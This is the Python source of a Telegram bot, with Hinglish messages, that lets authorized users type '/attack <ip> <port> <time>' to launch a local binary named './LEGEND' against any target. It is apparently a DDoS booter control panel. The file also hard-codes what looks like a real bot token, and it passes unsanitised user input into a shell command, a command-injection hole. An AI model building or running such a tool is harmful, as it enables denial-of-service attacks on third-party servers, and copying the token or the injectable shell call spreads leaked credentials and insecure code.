import telebot
import time
import subprocess
import random
from threading import Timer

# Bot token and admin information
BOT_TOKEN = '7228305815:AAGZvYtuYd6BC1J1qYeneQFPzDa4XDW5tYQ'
ADMIN_ID = 1232047106
OWNER_NAME = '@OWNERSRK'
CHANNEL_LINK = 'https://youtube.com/@zeroflexislive?si=zRItV1qSr1cGoEqX'

# Initialize the bot
bot = telebot.TeleBot(BOT_TOKEN)

# User and Group Management
authorized_users = set([ADMIN_ID])
allowed_groups = set([-1002322006686])  # Yahan apna group ID daalein

# Fun messages
welcome_messages = [
    f"Yo! Main hoon {OWNER_NAME} ka secret agent. Kya haal hai?",
    f"Bhai! {OWNER_NAME} ka bot bol raha hoon. Ready ho sab kuch hilane ke liye?",
    f"Aaja bhai! {OWNER_NAME} ke bot ki duniya me, idhar sirf mazedari chalegi!"
]

# Check if the message is from an allowed group
def is_group_allowed(message):
    if message.chat.id in allowed_groups:
        return True
    else:
        bot.reply_to(message, "Is group ko bot use karne ki permission nahi hai! 🚫")
        return False

# Start command
@bot.message_handler(commands=['start'])
def start(message):
    if not is_group_allowed(message):
        return
    response = random.choice(welcome_messages)
    bot.reply_to(message, response)

# Add user command (Admin only)
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            authorized_users.add(user_id)
            bot.reply_to(message, f"User {user_id} ko hamari gang me shamil kar liya! ✅")
        except (IndexError, ValueError):
            bot.reply_to(message, "Bhai sahi ID bhejo na! 🤨")
    else:
        bot.reply_to(message, "Sirf boss (admin) hi naye bande add kar sakte hain! 🚫")

# Attack command with validation
@bot.message_handler(commands=['attack'])
def attack(message):
    if not is_group_allowed(message):
        return
    
    user_id = message.from_user.id
    if user_id not in authorized_users:
        bot.reply_to(message, "Are bhai! Tumhe toh permission nahi hai! 🚫")
        return

    try:
        _, ip, port, duration = message.text.split()
        duration = min(int(duration), 180)
        command = f"./LEGEND {ip} {port} {duration}"

        try:
            subprocess.Popen(command, shell=True)
            bot.reply_to(message, f"Attack start! Target: {ip}:{port} for {duration} sec.")
        except Exception as e:
            bot.reply_to(message, f"Kuch gadbad ho gayi: {e} 😵")

    except (IndexError, ValueError):
        bot.reply_to(message, "Format sahi bhejo: /attack <ip> <port> <time> (Max 180 sec) ⚠️")

# Start the bot
print("Bot is running... 🚀")
bot.infinity_polling()

